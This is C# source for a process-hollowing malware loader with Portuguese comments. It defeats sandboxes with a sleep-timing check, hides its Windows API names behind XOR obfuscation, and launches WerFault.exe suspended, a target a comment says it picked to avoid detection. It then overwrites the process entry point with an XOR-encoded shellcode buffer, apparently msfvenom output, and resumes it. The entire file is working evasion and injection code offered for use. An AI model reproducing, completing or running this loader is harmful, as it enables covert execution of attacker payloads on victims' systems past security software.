using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace HollowEvasion
{
    public class Program
    {
        // Constantes comuns usadas no código para clareza
        public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        public const uint CREATE_SUSPENDED = 0x4; // cria o processo em estado suspenso
        public const uint MEM_COMMIT = 0x1000;
        public const uint MEM_RESERVE = 0x2000;
        public const uint MEM_COMMIT_RESERVE = MEM_COMMIT | MEM_RESERVE; // 0x3000
        public const uint PAGE_EXECUTE_READ = 0x20;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;

        // --- DELEGADOS (Definições necessárias para chamadas dinâmicas) ---

        // CORREÇÃO CRÍTICA: CharSet.Unicode para evitar Erro 2 (File Not Found)
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        // Delegate para CreateProcessW (versão Unicode)
        // Parâmetros equivalentes aos da API:
        // - lpApplicationName: caminho do executável (pode ser null)
        // - lpCommandLine: linha de comando (pode conter o caminho)
        // - lpProcessAttributes / lpThreadAttributes: ponteiros para SECURITY_ATTRIBUTES (geralmente IntPtr.Zero)
        // - bInheritHandles: se handles herdáveis serão passados
        // - dwCreationFlags: flags de criação (ex.: CREATE_SUSPENDED)
        // - lpEnvironment: bloco de ambiente (null para herdar o atual)
        // - lpCurrentDirectory: diretório de trabalho do processo filho
        // - lpStartupInfo: informações de startup (janelas, handles std)
        // - lpProcessInformation: saída com handles/IDs do processo/thread
        public delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        // Delegate para WriteProcessMemory
        // - hProcess: handle do processo remoto com permissão de escrita
        // - lpBaseAddress: endereço destino no processo remoto
        // - lpBuffer: dados locais a serem escritos
        // - nSize: tamanho em bytes
        // - lpNumberOfBytesWritten: saída com bytes escritos
        public delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        // Delegate para VirtualProtectEx
        // - hProcess: handle do processo remoto
        // - lpAddress: endereço base da região a alterar
        // - dwSize: tamanho da região
        // - flNewProtect: nova proteção (ex.: PAGE_EXECUTE_READ)
        // - lpflOldProtect: saída com a proteção anterior
        public delegate bool VirtualProtectExDelegate(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        // Delegate para ResumeThread
        // - hThread: handle da thread a ser retomada
        // Retorna: contagem de suspensão anterior ou 0xFFFFFFFF em falha
        public delegate uint ResumeThreadDelegate(IntPtr hThread);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        // Delegate para ReadProcessMemory
        // - hProcess: handle do processo com permissão de leitura
        // - lpBaseAddress: endereço a ler no processo remoto
        // - lpBuffer: buffer local para receber os dados
        // - nSize: quantidade de bytes a ler
        // - lpNumberOfBytesRead: saída com bytes lidos
        public delegate bool ReadProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesRead);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        // Delegate para ZwQueryInformationProcess (NT)
        // - hProcess: handle do processo alvo
        // - procInformationClass: código da informação solicitada (0 = ProcessBasicInformation)
        // - procInformation: estrutura que receberá os dados (PROCESS_BASIC_INFORMATION)
        // - ProcInfoLen: tamanho do buffer em bytes
        // - retlen: saída com tamanho escrito/necessário
        // Retorno: NTSTATUS (0 = sucesso)
        public delegate int ZwQueryInformationProcessDelegate(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);


        // --- ESTRUTURAS ---
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO { public Int32 cb; public string r1, r2, r3; public Int32 x, y, xs, ys, xc, yc, fa, dwFlags; public Int16 sw; public Int16 cb2; public IntPtr r4, hIn, hOut, hErr; }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION { public IntPtr ExitStatus; public IntPtr PebBaseAddress; public UIntPtr AffinityMask; public int BasePriority; public UIntPtr UniqueProcessId; public UIntPtr InheritedFromUniqueProcessId; }

        // --- IMPORTAÇÕES BÁSICAS (Apenas para o Bootstrap) ---
        // GetProcAddress: procura o endereço de uma função exportada num módulo carregado.
        // - hModule: handle do módulo no processo atual (GetModuleHandle)
        // - procedureName: nome da função exportada (ASCII/ANSI em geral)
        // Retorno: ponteiro para a função (no espaço de endereço do processo atual)
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
        // GetModuleHandle: retorna o handle de um módulo já carregado no processo atual.
        // - lpModuleName: nome do módulo (ex.: "kernel32.dll")
        // Retorno: handle do módulo ou IntPtr.Zero em falha
        [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);

        // --- FUNÇÃO DE DEOFUSCAÇÃO ---
        // Chave XOR: 0xFA
        public static string D(string hex)
        {
            var bytes = new byte[hex.Length / 2];
            for (var i = 0; i < bytes.Length; i++) bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            for (var i = 0; i < bytes.Length; i++) bytes[i] = (byte)(bytes[i] ^ 0xFA);
            return Encoding.ASCII.GetString(bytes);
        }

        static void Main(string[] args)
        {
            // 1. ANTI-EMULAÇÃO
            DateTime t1 = DateTime.Now;
            Thread.Sleep(2500);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 2.0) return;

            // --- RESOLUÇÃO DINÂMICA DE APIS (OFUSCADAS) ---

            // "kernel32.dll"
            IntPtr hKernel = GetModuleHandle(D("919F88949F96C9C8D49E9696"));
            // "ntdll.dll"
            IntPtr hNtdll = GetModuleHandle(D("948E9E9696D49E9696"));

            // "CreateProcessW"
            var CreateProcess = (CreateProcessDelegate)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hKernel, D("B9889F9B8E9FAA8895999F8989AD")), typeof(CreateProcessDelegate));

            // "WriteProcessMemory"
            var WriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hKernel, D("AD88938E9FAA8895999F8989B79F97958883")), typeof(WriteProcessMemoryDelegate));

            // "VirtualProtectEx"
            var VirtualProtectEx = (VirtualProtectExDelegate)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hKernel, D("AC93888E8F9B96AA88958E9F998EBF82")), typeof(VirtualProtectExDelegate));

            // "ResumeThread"
            var ResumeThread = (ResumeThreadDelegate)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hKernel, D("A89F898F979FAE92889F9B9E")), typeof(ResumeThreadDelegate));

            // "ReadProcessMemory"
            var ReadProcessMemory = (ReadProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hKernel, D("A89F9B9EAA8895999F8989B79F97958883")), typeof(ReadProcessMemoryDelegate));

            // "ZwQueryInformationProcess"
            var ZwQueryInformationProcess = (ZwQueryInformationProcessDelegate)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hNtdll, D("A08DAB8F9F8883B3949C9588979B8E939594AA8895999F8989")), typeof(ZwQueryInformationProcessDelegate));


            // 2. CRIAÇÃO DO PROCESSO
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // ALVO: "C:\Windows\System32\WerFault.exe" (Ofuscado)
            // WerFault é melhor que svchost para evitar detecções simples
            string targetPath = D("B9C0A6AD93949E958D89A6A983898E9F97C9C8A694958E9F8A9B9ED49F829F");

            // 0x4 = CREATE_SUSPENDED (usamos constante para legibilidade)
            bool res = CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            if (!res) return; // Falha silenciosa se der erro

            // 3. MAPEAMENTO (HOLLOWING)
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            ZwQueryInformationProcess(pi.hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((long)bi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nReadPtr;
            ReadProcessMemory(pi.hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nReadPtr);
            IntPtr baseAddr = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] header = new byte[0x200];
            ReadProcessMemory(pi.hProcess, baseAddr, header, header.Length, out nReadPtr);
            uint e_lfanew = BitConverter.ToUInt32(header, 0x3c);
            uint entrypoint_rva = BitConverter.ToUInt32(header, (int)e_lfanew + 0x28);
            IntPtr addressOfEntryPoint = (IntPtr)((long)baseAddr + entrypoint_rva);

            // 4. PAYLOAD (Use o seu gerado pelo msfvenom x64)
            byte[] buf = new byte[651] {
            0xa7, 0x13, 0xd8, 0xbf, 0xab, 0xb3, 0x97, 0x5b, 0x5b, 0x5b, 0x1a, 0x0a,
            0x1a, 0x0b, 0x09, 0x0a, 0x0d, 0x13, 0x6a, 0x89, 0x3e, 0x13, 0xd0, 0x09,
            0x3b, 0x13, 0xd0, 0x09, 0x43, 0x13, 0xd0, 0x09, 0x7b, 0x16, 0x6a, 0x92,
            0x13, 0x54, 0xec, 0x11, 0x11, 0x13, 0xd0, 0x29, 0x0b, 0x13, 0x6a, 0x9b,
            0xf7, 0x67, 0x3a, 0x27, 0x59, 0x77, 0x7b, 0x1a, 0x9a, 0x92, 0x56, 0x1a,
            0x5a, 0x9a, 0xb9, 0xb6, 0x09, 0x13, 0xd0, 0x09, 0x7b, 0xd0, 0x19, 0x67,
            0x1a, 0x0a, 0x13, 0x5a, 0x8b, 0x3d, 0xda, 0x23, 0x43, 0x50, 0x59, 0x54,
            0xde, 0x29, 0x5b, 0x5b, 0x5b, 0xd0, 0xdb, 0xd3, 0x5b, 0x5b, 0x5b, 0x13,
            0xde, 0x9b, 0x2f, 0x3c, 0x13, 0x5a, 0x8b, 0xd0, 0x13, 0x43, 0x0b, 0x1f,
            0xd0, 0x1b, 0x7b, 0x12, 0x5a, 0x8b, 0xb8, 0x0d, 0x13, 0xa4, 0x92, 0x1a,
            0xd0, 0x6f, 0xd3, 0x13, 0x5a, 0x8d, 0x16, 0x6a, 0x92, 0x13, 0x6a, 0x9b,
            0x1a, 0x9a, 0x92, 0x56, 0xf7, 0x1a, 0x5a, 0x9a, 0x63, 0xbb, 0x2e, 0xaa,
            0x17, 0x58, 0x17, 0x7f, 0x53, 0x1e, 0x62, 0x8a, 0x2e, 0x83, 0x03, 0x1f,
            0xd0, 0x1b, 0x7f, 0x12, 0x5a, 0x8b, 0x3d, 0x1a, 0xd0, 0x57, 0x13, 0x1f,
            0xd0, 0x1b, 0x47, 0x12, 0x5a, 0x8b, 0x1a, 0xd0, 0x5f, 0xd3, 0x1a, 0x03,
            0x13, 0x5a, 0x8b, 0x1a, 0x03, 0x05, 0x02, 0x01, 0x1a, 0x03, 0x1a, 0x02,
            0x1a, 0x01, 0x13, 0xd8, 0xb7, 0x7b, 0x1a, 0x09, 0xa4, 0xbb, 0x03, 0x1a,
            0x02, 0x01, 0x13, 0xd0, 0x49, 0xb2, 0x10, 0xa4, 0xa4, 0xa4, 0x06, 0x12,
            0xe5, 0x2c, 0x28, 0x69, 0x04, 0x68, 0x69, 0x5b, 0x5b, 0x1a, 0x0d, 0x12,
            0xd2, 0xbd, 0x13, 0xda, 0xb7, 0xfb, 0x5a, 0x5b, 0x5b, 0x12, 0xd2, 0xbe,
            0x12, 0xe7, 0x59, 0x5b, 0x5b, 0x4e, 0x9b, 0xf3, 0x6a, 0xcf, 0x1a, 0x0f,
            0x12, 0xd2, 0xbf, 0x17, 0xd2, 0xaa, 0x1a, 0xe1, 0x17, 0x2c, 0x7d, 0x5c,
            0xa4, 0x8e, 0x17, 0xd2, 0xb1, 0x33, 0x5a, 0x5a, 0x5b, 0x5b, 0x02, 0x1a,
            0xe1, 0x72, 0xdb, 0x30, 0x5b, 0xa4, 0x8e, 0x31, 0x51, 0x1a, 0x05, 0x0b,
            0x0b, 0x16, 0x6a, 0x92, 0x16, 0x6a, 0x9b, 0x13, 0xa4, 0x9b, 0x13, 0xd2,
            0x99, 0x13, 0xa4, 0x9b, 0x13, 0xd2, 0x9a, 0x1a, 0xe1, 0xb1, 0x54, 0x84,
            0xbb, 0xa4, 0x8e, 0x13, 0xd2, 0x9c, 0x31, 0x4b, 0x1a, 0x03, 0x17, 0xd2,
            0xb9, 0x13, 0xd2, 0xa2, 0x1a, 0xe1, 0xc2, 0xfe, 0x2f, 0x3a, 0xa4, 0x8e,
            0xde, 0x9b, 0x2f, 0x51, 0x12, 0xa4, 0x95, 0x2e, 0xbe, 0xb3, 0x44, 0x5a,
            0x5b, 0x5b, 0x13, 0xd8, 0xb7, 0x4b, 0x13, 0xd2, 0xb9, 0x16, 0x6a, 0x92,
            0x31, 0x5f, 0x1a, 0x03, 0x13, 0xd2, 0xa2, 0x1a, 0xe1, 0x59, 0x82, 0x93,
            0x04, 0xa4, 0x8e, 0xd8, 0xa3, 0x5b, 0x54, 0xd5, 0x36, 0x5b, 0x5b, 0x5b,
            0x13, 0xd8, 0x9f, 0x7b, 0x05, 0xd2, 0xad, 0xda, 0xad, 0x17, 0x7b, 0x94,
            0x75, 0x17, 0xd6, 0xc5, 0x5b, 0x5a, 0x5b, 0x5b, 0x31, 0x1b, 0x1a, 0x02,
            0x33, 0x5b, 0x4b, 0x5b, 0x5b, 0x1a, 0x03, 0x13, 0xd2, 0xa9, 0x13, 0x6a,
            0x92, 0x1a, 0xe1, 0x03, 0xff, 0x08, 0xbe, 0xa4, 0x8e, 0x13, 0xd6, 0xc3,
            0x5b, 0x5a, 0x5b, 0x5b, 0x12, 0xd2, 0x84, 0x08, 0x0d, 0x0b, 0x16, 0x6a,
            0x92, 0x12, 0xd2, 0xab, 0x13, 0xd2, 0x81, 0x13, 0xd2, 0xa2, 0x1a, 0xe1,
            0x59, 0x82, 0x93, 0x04, 0xa4, 0x8e, 0x13, 0xd8, 0x9f, 0x7b, 0xd8, 0xa3,
            0x5b, 0x26, 0x73, 0x03, 0x1a, 0x0c, 0x02, 0x33, 0x5b, 0x1b, 0x5b, 0x5b,
            0x1a, 0x03, 0x31, 0x5b, 0x01, 0x1a, 0xe1, 0x50, 0x74, 0x54, 0x6b, 0xa4,
            0x8e, 0x0c, 0x02, 0x1a, 0xe1, 0x2e, 0x35, 0x16, 0x3a, 0xa4, 0x8e, 0x12,
            0xa4, 0x95, 0xb2, 0x7b, 0xa4, 0xa4, 0xa4, 0x13, 0x5a, 0x98, 0x13, 0x72,
            0x9d, 0x2e, 0xe8, 0x12, 0xd2, 0xa5, 0x04, 0x02, 0x1a, 0x02, 0x1a, 0x0d,
            0xb3, 0x4b, 0x5b, 0x5b, 0x5b, 0xff, 0xc3, 0xea, 0xd3, 0xa5, 0xf4, 0x13,
            0xd4, 0x08, 0xc6, 0x31, 0xcf, 0x6f, 0x9d, 0xdc, 0x93, 0x05, 0x13, 0x6a,
            0x9b, 0x12, 0xd2, 0xa3, 0xf1, 0xa5, 0x9b, 0x2e, 0xa0, 0x13, 0x6a, 0x80,
            0x1a, 0x59, 0x47, 0x5b, 0x13, 0xd2, 0x99, 0xdb, 0xb9, 0x54, 0x59, 0x47,
            0x4d, 0x1a, 0xd1, 0x4f, 0x5b, 0x1a, 0xdd, 0x4f, 0x43, 0x1a, 0xd3, 0x4f,
            0x5b, 0xa5, 0x9b, 0x2e, 0xb8, 0x13, 0x6a, 0x80, 0xa5, 0x9b, 0x1a, 0x59,
            0x47, 0x5b, 0x1a, 0xd1, 0x4f, 0x5b, 0x1a, 0xdd, 0x4f, 0x43, 0x1a, 0xd3,
            0x4f, 0x5b, 0x1a, 0x59, 0x4f, 0x43, 0x1a, 0xd1, 0x4f, 0x4b, 0x1a, 0x6b,
            0x4a, 0x12, 0xa4, 0x9a, 0x13, 0xa4, 0x92, 0x2e, 0x80, 0x04, 0x1a, 0xa4,
            0xbc, 0x03, 0x31, 0x5b, 0x02, 0xe0, 0xbb, 0x46, 0x71, 0x51, 0x1a, 0xd2,
            0x81, 0xa4, 0x8e
            };

            // DECRYPT DO PAYLOAD
            byte xKey = 0x5b;
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ xKey);
            }


            // 5. INJEÇÃO
            IntPtr nWritten;
            WriteProcessMemory(pi.hProcess, addressOfEntryPoint, buf, buf.Length, out nWritten);

            // 6. MUDAR PERMISSÃO E EXECUTAR
            uint oldProtect;
            // 0x20 = PAGE_EXECUTE_READ (permitir execução/leitura)
            VirtualProtectEx(pi.hProcess, addressOfEntryPoint, (UIntPtr)buf.Length, PAGE_EXECUTE_READ, out oldProtect); // altera permissões na região do payload

            ResumeThread(pi.hThread);
        }
    }
}